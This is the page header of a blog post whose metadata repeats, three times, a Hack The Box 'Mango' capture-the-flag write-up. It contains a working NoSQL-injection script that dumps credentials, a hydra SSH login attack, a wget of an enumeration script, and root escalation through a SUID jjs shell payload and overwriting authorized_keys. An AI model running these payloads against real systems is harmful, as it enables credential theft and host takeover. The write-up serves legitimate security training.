<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Mango" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.162 mango.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ nmap -sV -sT -sC mango.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 13:05 EST Nmap scan report for mango.htb (10.10.10.162) Host is up (0.26s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 403 Forbidden 443/tcp open ssl/ssl Apache httpd (SSL-only mode) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 54.48 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe we can find some information on it ? Forbidden… Bruteforcing the directory and pages also returned no results :( Lets see if the https service has something for us? Looks like a copycat of Google’s search engine! But unfortunately it does nothing at all. However, clicking on the “Analytics” button brought us to another page. The content seems to be from some external websites, which happen to be out of our scope so we can ignore this :) If we check our nmap results again and look closely at the ssl-cert information under port 443, we realise that there is a subdomain under mango.htb: staging-order.mango.htb. Viewing the certificate via the browser also shows the same domain name. Lets add staging-order.mango.htb to our /etc/hosts and see if that changes anything. 1 2 3 $ cat /etc/hosts ... 10.10.10.162 mango.htb staging-order.mango.htb Entering https://staging-order.mango.htb into the browser shows a login screen! At this time I was kinda stuck because I had no credentials to test with and I even tried using SQL injection, but to no avail :( I decided to consult the forums and got a hint that to think about what database the web app was using and how it relates to the name of this box aka Mango. So I enterd “mango db” into Google and saw this: I went on to search for MongoDB injection and found this. I then tried to login with some credentials and used Burp Suite to intercept the request. I then modified the request body parameters: And got redirected to /home.php! Seems like the web app is vulnerable to NoSQL injections! I then made a script to help me automate the dumping out of the credentials in the database: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 import requests import string from urllib import quote_plus import re VALID_CHARS = string.printable URL = &quot;http://staging-order.mango.htb/&quot; HEADERS = {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;} MAX_FIELD_LENGTH = 255 def check_valid(payload): &quot;&quot;&quot;This function returns True if the request results in a successful login&quot;&quot;&quot; return requests.post(URL, data=payload,headers=HEADERS, allow_redirects=False).headers.get(&#39;location&#39;, &#39;&#39;) == &#39;home.php&#39; def enumerate_usernames(): &quot;&quot;&quot;This function returns a list of usernames extracted&quot;&quot;&quot; list_of_usernames = [] valid_username_lengths = get_username_lengths() for user_len in valid_username_lengths: list_of_usernames += get_usernames(user_len) return list_of_usernames def get_username_lengths(): &quot;&quot;&quot;This function returns a list containing the various lengths of the usernames&quot;&quot;&quot; test_username_length_format = &quot;username[$regex]=^.{{{}}}$&amp;password[$ne]=something&amp;login=login&quot; valid_username_lengths = [] for i in xrange(1, FIELD_LENGTH + 1): payload = test_username_length_format.format(i) print(&quot;[*] Testing for username length: {}&quot;.format(i)) if check_valid(payload): # print(&quot;[*] Username length found: {}&quot;.format(i)) valid_username_lengths.append(i) return valid_username_lengths def get_usernames(length): &quot;&quot;&quot;This function returns a list of usernames of the given length&quot;&quot;&quot; usernames = set() test_username_format = &quot;username[$regex]=^{}.*$&amp;password[$ne]=something&amp;login=login&quot; while True: username = &quot;&quot; for idx in range(length): for i in VALID_CHARS: tmp = username + i print &quot;[*] Testing for username: {}&quot;.format(tmp) payload = test_username_format.format(tmp) if check_valid(payload): username = tmp break if username and username not in usernames: test_username_format += &quot;&amp;username[$ne]={}&quot;.format(username) usernames.add(username) print(&quot;[*] Username found: {}&quot;.format(username)) else: break return list(usernames) def get_password_length(username): &quot;&quot;&quot;This function returns the length of the password corresponding to the given username&quot;&quot;&quot; test_password_length_format = &quot;username={}&amp;password[$regex]=^.{{{}}}$&amp;login=login&quot; for i in xrange(1, FIELD_LENGTH + 1): print(&quot;[*] Testing for password length: {}&quot;.format(i)) payload = test_password_length_format.format(username, i) if check_valid(payload): return i def get_password(username): &quot;&quot;&quot;This function returns the password corresponding to the given username&quot;&quot;&quot; test_password_format = &quot;username={}&amp;password[$regex]=^{}.*$&amp;login=login&quot; password = &quot;&quot; for idx in range(get_password_length(username)): for i in VALID_CHARS: tmp = password + i print(&quot;[*] Testing for password: {}&quot;.format(tmp)) payload = test_password_format.format(username, quote_plus(re.escape(tmp))) if check_valid(payload): password = tmp print(&quot;[*] Password found: {}&quot;.format(password)) break return password def main(): &quot;&quot;&quot;This is the main function&quot;&quot;&quot; user_list = enumerate_usernames() for username in user_list: password = get_password(username) print(&quot;[*] Found {}:{}&quot;.format(username, password)) if __name__ == &quot;__main__&quot;: main() It takes a while to run (perhaps optimize using binary search?), but we managed to dump out 2 sets of credentials: 1 2 [*] Found admin:t9KcS3&gt;!0B#2 [*] Found mango:h3mXK8RhU~f{]f5H The web app doesn’t seem to have any other functionality that we can exploit so lets see if we can try using these credentials on the ssh service! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ cat user.txt admin mango $ cat pass.txt t9KcS3&gt;!0B#2 h3mXK8RhU~f{]f5H $ hydra -L user.txt -P pass.txt ssh://mango.htb Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-18 15:17:36 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task [DATA] attacking ssh://mango.htb:22/ [22][ssh] host: mango.htb login: mango password: h3mXK8RhU~f{]f5H 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-18 15:17:41 Using this set of credentials, we can ssh into the box: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ssh mango@mango.htb mango@mango.htb&#39;s password: mango@mango:~$ ls -al total 44 drwxr-xr-x 6 mango mango 4096 Apr 18 19:04 . drwxr-xr-x 4 root root 4096 Sep 27 2019 .. lrwxrwxrwx 1 mango mango 9 Sep 27 2019 .bash_history -&gt; /dev/null -rw-r--r-- 1 mango mango 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 mango mango 3771 Apr 4 2018 .bashrc drwx------ 2 mango mango 4096 Sep 28 2019 .cache -rw------- 1 mango mango 14 Apr 18 16:34 .dbshell drwx------ 3 mango mango 4096 Apr 18 18:23 .gnupg drwxrwxr-x 3 mango mango 4096 Apr 18 16:29 .local -rw------- 1 mango mango 0 Apr 18 16:34 .mongorc.js -rw-r--r-- 1 mango mango 807 Apr 4 2018 .profile drwx------ 2 mango mango 4096 Apr 18 18:31 .ssh -rw------- 1 mango mango 858 Apr 18 19:04 .viminfo Where’s the user.txt? Lets see if there are any other possible users on the box. 1 2 3 4 5 6 mango@mango:~$ ls -al /home total 16 drwxr-xr-x 4 root root 4096 Sep 27 2019 . drwxr-xr-x 23 root root 4096 Sep 27 2019 .. drwxr-xr-x 4 admin admin 4096 Apr 18 19:26 admin drwxr-xr-x 6 mango mango 4096 Apr 18 19:04 mango Seems like admin has the user.txt! user.txt Using su and the admin credentials we found in the web app database, we are able to login as admin. 1 2 3 4 mango@mango:~$ su admin Password: $ whoami admin Getting the flag was a piece of cake: 1 2 $ cat ~/user.txt 79bfXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration(2) As usual, I will use LinEnum to enumerate for ways to escalate to root. Spawning web server: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/LinEnum.sh . $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Retrieving the script: 1 2 3 4 5 6 7 8 9 10 11 $ cd /tmp $ wget http://10.10.XX.XX/LinEnum.sh --2020-04-18 20:04:09-- http://10.10.XX.XX/LinEnum.sh Connecting to 10.10.14.217:80... connected. HTTP request sent, awaiting response... 200 OK Length: 46476 (45K) [text/x-sh] Saving to: ‘LinEnum.sh’ LinEnum.sh 100%[====================================================================================================&gt;] 45.39K 78.8KB/s in 0.6s 2020-04-18 20:04:10 (78.8 KB/s) - ‘LinEnum.sh’ saved [46476/46476] Running the script: 1 2 3 4 5 $ chmod +x LinEnum.sh $ ./LinEnum.sh ... [+] Possibly interesting SUID files: -rwsr-sr-- 1 root admin 10352 Jul 18 2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs Alright, we can use this executable to escalate our privileges! With the SUID bit set on the file, we can execute jjs as if we are root. According to GTFOBins, we are able to spawn an interactive shell with elevated permissions: 1 2 3 4 5 $ cd /usr/lib/jvm/java-11-openjdk-amd64/bin/ $ echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;).waitFor()&quot; | ./jjs Warning: The jjs tool is planned to be removed from a future JDK release jjs&gt; Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc $@|sh${IFS}-p _ echo sh -p &lt;/dev/pts/0 &gt;/dev/pts/0 2&gt;/dev/pts/0&#39;).waitFor() # Unfortunately, it did spawn but it just hung there :( So we gotta think of an alternative way to get root shell. I tried to spawn a reverse shell back to my listener but it didn’t work. However, I realised that I was able to perform very simple commands like “cp” and “mv” but no piping or redirection. So how about we write to root’s authorized_keys file? 1 2 3 4 5 # cat /etc/ssh/sshd_config ... PermitRootLogin yes ... AllowUsers mango root root.txt From the above config, we can confirm that we are able to ssh directly into the box as root. To do so, first we’ll need to generate a SSH keypair. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa. Your public key has been saved in /root/.ssh/id_rsa.pub. The key fingerprint is: SHA256:TEPWxxvFEd9AoEM+xQGEYHHyVHuUeSugqKuFihcLCf4 root@kali The key&#39;s randomart image is: +---[RSA 3072]----+ | =o===+=O*o | | . B.oo=B oo.| | .+.*o.+ .o| |. .o.. +o . | |o. . S . | |o.... | | .oo.. | |..oE. | |o... | +----[SHA256]-----+ Open the public key/root/.ssh/id_rsa.pub and copy the contents into your clipboard. Echo it into a file in the tmp directory. 1 # echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXGz/VwVW7AUU35k3HgAjJ7aYLCgE9miz7g4XvCsB+Bk/0NpQWIcd4PUXe4JSe0CK5Dgj2F5LVnKd6s87HN0v0s8RUcsDEKsnwYhIrHmL8G2nYgEl0Pixj7u67lHJbs1pCFfMP4Aj0pJzUoCHhroqXpkdj6P8/FHUnBKntyo51BXzqemUNrif3joCNF/AbQUTPBFMAHmciN2huxU8Q1E8vmVR3SXZbmKw4ZX8wj8sf49hJDCNm2qpiVNyB4nS8KaShMP69ya0mH9ynF2P0YF4nJJlbHcO/j9jvbK5NNMYQSl/xmyL+9okjExiXFH0yQulpDKWsnZv6s8N9K3ASwWIsyavxc7B1UnqOp2elLuRgLI/3QL5XXEEU+l7s/MJ5l9LTvSWBS4m2e1Xqlye41AJAE38p8qq0wX9q3AefEHlOnOcn5XiQQ9H37cx6dayf9B+gKim1G/KycAiURD8Q/+cNs9KCuS9p8gTdReA9ZMSLQ5dXV+tHd06ENAAPYY/HH58= root@kali&quot; &gt; /tmp/secret And now overwrite the root’s authorized_keys file! 1 $ echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;cp /tmp/secret /root/.ssh/authorized_keys&#39;).waitFor()&quot; | ./jjs Now, we are able to ssh into the root account using our private key /root/id_rsa: 1 2 3 4 $ ssh -i /root/id_rsa root@mango.htb ... root@mango:~# cat root.txt 8a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.162 mango.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ nmap -sV -sT -sC mango.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 13:05 EST Nmap scan report for mango.htb (10.10.10.162) Host is up (0.26s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 403 Forbidden 443/tcp open ssl/ssl Apache httpd (SSL-only mode) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 54.48 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe we can find some information on it ? Forbidden… Bruteforcing the directory and pages also returned no results :( Lets see if the https service has something for us? Looks like a copycat of Google’s search engine! But unfortunately it does nothing at all. However, clicking on the “Analytics” button brought us to another page. The content seems to be from some external websites, which happen to be out of our scope so we can ignore this :) If we check our nmap results again and look closely at the ssl-cert information under port 443, we realise that there is a subdomain under mango.htb: staging-order.mango.htb. Viewing the certificate via the browser also shows the same domain name. Lets add staging-order.mango.htb to our /etc/hosts and see if that changes anything. 1 2 3 $ cat /etc/hosts ... 10.10.10.162 mango.htb staging-order.mango.htb Entering https://staging-order.mango.htb into the browser shows a login screen! At this time I was kinda stuck because I had no credentials to test with and I even tried using SQL injection, but to no avail :( I decided to consult the forums and got a hint that to think about what database the web app was using and how it relates to the name of this box aka Mango. So I enterd “mango db” into Google and saw this: I went on to search for MongoDB injection and found this. I then tried to login with some credentials and used Burp Suite to intercept the request. I then modified the request body parameters: And got redirected to /home.php! Seems like the web app is vulnerable to NoSQL injections! I then made a script to help me automate the dumping out of the credentials in the database: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 import requests import string from urllib import quote_plus import re VALID_CHARS = string.printable URL = &quot;http://staging-order.mango.htb/&quot; HEADERS = {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;} MAX_FIELD_LENGTH = 255 def check_valid(payload): &quot;&quot;&quot;This function returns True if the request results in a successful login&quot;&quot;&quot; return requests.post(URL, data=payload,headers=HEADERS, allow_redirects=False).headers.get(&#39;location&#39;, &#39;&#39;) == &#39;home.php&#39; def enumerate_usernames(): &quot;&quot;&quot;This function returns a list of usernames extracted&quot;&quot;&quot; list_of_usernames = [] valid_username_lengths = get_username_lengths() for user_len in valid_username_lengths: list_of_usernames += get_usernames(user_len) return list_of_usernames def get_username_lengths(): &quot;&quot;&quot;This function returns a list containing the various lengths of the usernames&quot;&quot;&quot; test_username_length_format = &quot;username[$regex]=^.{{{}}}$&amp;password[$ne]=something&amp;login=login&quot; valid_username_lengths = [] for i in xrange(1, FIELD_LENGTH + 1): payload = test_username_length_format.format(i) print(&quot;[*] Testing for username length: {}&quot;.format(i)) if check_valid(payload): # print(&quot;[*] Username length found: {}&quot;.format(i)) valid_username_lengths.append(i) return valid_username_lengths def get_usernames(length): &quot;&quot;&quot;This function returns a list of usernames of the given length&quot;&quot;&quot; usernames = set() test_username_format = &quot;username[$regex]=^{}.*$&amp;password[$ne]=something&amp;login=login&quot; while True: username = &quot;&quot; for idx in range(length): for i in VALID_CHARS: tmp = username + i print &quot;[*] Testing for username: {}&quot;.format(tmp) payload = test_username_format.format(tmp) if check_valid(payload): username = tmp break if username and username not in usernames: test_username_format += &quot;&amp;username[$ne]={}&quot;.format(username) usernames.add(username) print(&quot;[*] Username found: {}&quot;.format(username)) else: break return list(usernames) def get_password_length(username): &quot;&quot;&quot;This function returns the length of the password corresponding to the given username&quot;&quot;&quot; test_password_length_format = &quot;username={}&amp;password[$regex]=^.{{{}}}$&amp;login=login&quot; for i in xrange(1, FIELD_LENGTH + 1): print(&quot;[*] Testing for password length: {}&quot;.format(i)) payload = test_password_length_format.format(username, i) if check_valid(payload): return i def get_password(username): &quot;&quot;&quot;This function returns the password corresponding to the given username&quot;&quot;&quot; test_password_format = &quot;username={}&amp;password[$regex]=^{}.*$&amp;login=login&quot; password = &quot;&quot; for idx in range(get_password_length(username)): for i in VALID_CHARS: tmp = password + i print(&quot;[*] Testing for password: {}&quot;.format(tmp)) payload = test_password_format.format(username, quote_plus(re.escape(tmp))) if check_valid(payload): password = tmp print(&quot;[*] Password found: {}&quot;.format(password)) break return password def main(): &quot;&quot;&quot;This is the main function&quot;&quot;&quot; user_list = enumerate_usernames() for username in user_list: password = get_password(username) print(&quot;[*] Found {}:{}&quot;.format(username, password)) if __name__ == &quot;__main__&quot;: main() It takes a while to run (perhaps optimize using binary search?), but we managed to dump out 2 sets of credentials: 1 2 [*] Found admin:t9KcS3&gt;!0B#2 [*] Found mango:h3mXK8RhU~f{]f5H The web app doesn’t seem to have any other functionality that we can exploit so lets see if we can try using these credentials on the ssh service! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ cat user.txt admin mango $ cat pass.txt t9KcS3&gt;!0B#2 h3mXK8RhU~f{]f5H $ hydra -L user.txt -P pass.txt ssh://mango.htb Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-18 15:17:36 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task [DATA] attacking ssh://mango.htb:22/ [22][ssh] host: mango.htb login: mango password: h3mXK8RhU~f{]f5H 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-18 15:17:41 Using this set of credentials, we can ssh into the box: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ssh mango@mango.htb mango@mango.htb&#39;s password: mango@mango:~$ ls -al total 44 drwxr-xr-x 6 mango mango 4096 Apr 18 19:04 . drwxr-xr-x 4 root root 4096 Sep 27 2019 .. lrwxrwxrwx 1 mango mango 9 Sep 27 2019 .bash_history -&gt; /dev/null -rw-r--r-- 1 mango mango 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 mango mango 3771 Apr 4 2018 .bashrc drwx------ 2 mango mango 4096 Sep 28 2019 .cache -rw------- 1 mango mango 14 Apr 18 16:34 .dbshell drwx------ 3 mango mango 4096 Apr 18 18:23 .gnupg drwxrwxr-x 3 mango mango 4096 Apr 18 16:29 .local -rw------- 1 mango mango 0 Apr 18 16:34 .mongorc.js -rw-r--r-- 1 mango mango 807 Apr 4 2018 .profile drwx------ 2 mango mango 4096 Apr 18 18:31 .ssh -rw------- 1 mango mango 858 Apr 18 19:04 .viminfo Where’s the user.txt? Lets see if there are any other possible users on the box. 1 2 3 4 5 6 mango@mango:~$ ls -al /home total 16 drwxr-xr-x 4 root root 4096 Sep 27 2019 . drwxr-xr-x 23 root root 4096 Sep 27 2019 .. drwxr-xr-x 4 admin admin 4096 Apr 18 19:26 admin drwxr-xr-x 6 mango mango 4096 Apr 18 19:04 mango Seems like admin has the user.txt! user.txt Using su and the admin credentials we found in the web app database, we are able to login as admin. 1 2 3 4 mango@mango:~$ su admin Password: $ whoami admin Getting the flag was a piece of cake: 1 2 $ cat ~/user.txt 79bfXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration(2) As usual, I will use LinEnum to enumerate for ways to escalate to root. Spawning web server: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/LinEnum.sh . $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Retrieving the script: 1 2 3 4 5 6 7 8 9 10 11 $ cd /tmp $ wget http://10.10.XX.XX/LinEnum.sh --2020-04-18 20:04:09-- http://10.10.XX.XX/LinEnum.sh Connecting to 10.10.14.217:80... connected. HTTP request sent, awaiting response... 200 OK Length: 46476 (45K) [text/x-sh] Saving to: ‘LinEnum.sh’ LinEnum.sh 100%[====================================================================================================&gt;] 45.39K 78.8KB/s in 0.6s 2020-04-18 20:04:10 (78.8 KB/s) - ‘LinEnum.sh’ saved [46476/46476] Running the script: 1 2 3 4 5 $ chmod +x LinEnum.sh $ ./LinEnum.sh ... [+] Possibly interesting SUID files: -rwsr-sr-- 1 root admin 10352 Jul 18 2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs Alright, we can use this executable to escalate our privileges! With the SUID bit set on the file, we can execute jjs as if we are root. According to GTFOBins, we are able to spawn an interactive shell with elevated permissions: 1 2 3 4 5 $ cd /usr/lib/jvm/java-11-openjdk-amd64/bin/ $ echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;).waitFor()&quot; | ./jjs Warning: The jjs tool is planned to be removed from a future JDK release jjs&gt; Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc $@|sh${IFS}-p _ echo sh -p &lt;/dev/pts/0 &gt;/dev/pts/0 2&gt;/dev/pts/0&#39;).waitFor() # Unfortunately, it did spawn but it just hung there :( So we gotta think of an alternative way to get root shell. I tried to spawn a reverse shell back to my listener but it didn’t work. However, I realised that I was able to perform very simple commands like “cp” and “mv” but no piping or redirection. So how about we write to root’s authorized_keys file? 1 2 3 4 5 # cat /etc/ssh/sshd_config ... PermitRootLogin yes ... AllowUsers mango root root.txt From the above config, we can confirm that we are able to ssh directly into the box as root. To do so, first we’ll need to generate a SSH keypair. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa. Your public key has been saved in /root/.ssh/id_rsa.pub. The key fingerprint is: SHA256:TEPWxxvFEd9AoEM+xQGEYHHyVHuUeSugqKuFihcLCf4 root@kali The key&#39;s randomart image is: +---[RSA 3072]----+ | =o===+=O*o | | . B.oo=B oo.| | .+.*o.+ .o| |. .o.. +o . | |o. . S . | |o.... | | .oo.. | |..oE. | |o... | +----[SHA256]-----+ Open the public key/root/.ssh/id_rsa.pub and copy the contents into your clipboard. Echo it into a file in the tmp directory. 1 # echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXGz/VwVW7AUU35k3HgAjJ7aYLCgE9miz7g4XvCsB+Bk/0NpQWIcd4PUXe4JSe0CK5Dgj2F5LVnKd6s87HN0v0s8RUcsDEKsnwYhIrHmL8G2nYgEl0Pixj7u67lHJbs1pCFfMP4Aj0pJzUoCHhroqXpkdj6P8/FHUnBKntyo51BXzqemUNrif3joCNF/AbQUTPBFMAHmciN2huxU8Q1E8vmVR3SXZbmKw4ZX8wj8sf49hJDCNm2qpiVNyB4nS8KaShMP69ya0mH9ynF2P0YF4nJJlbHcO/j9jvbK5NNMYQSl/xmyL+9okjExiXFH0yQulpDKWsnZv6s8N9K3ASwWIsyavxc7B1UnqOp2elLuRgLI/3QL5XXEEU+l7s/MJ5l9LTvSWBS4m2e1Xqlye41AJAE38p8qq0wX9q3AefEHlOnOcn5XiQQ9H37cx6dayf9B+gKim1G/KycAiURD8Q/+cNs9KCuS9p8gTdReA9ZMSLQ5dXV+tHd06ENAAPYY/HH58= root@kali&quot; &gt; /tmp/secret And now overwrite the root’s authorized_keys file! 1 $ echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;cp /tmp/secret /root/.ssh/authorized_keys&#39;).waitFor()&quot; | ./jjs Now, we are able to ssh into the root account using our private key /root/id_rsa: 1 2 3 4 $ ssh -i /root/id_rsa root@mango.htb ... root@mango:~# cat root.txt 8a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/mango-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/mango-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-04-19T05:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Mango" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/mango-htb/"},"description":"Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.162 mango.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ nmap -sV -sT -sC mango.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 13:05 EST Nmap scan report for mango.htb (10.10.10.162) Host is up (0.26s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 403 Forbidden 443/tcp open ssl/ssl Apache httpd (SSL-only mode) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time 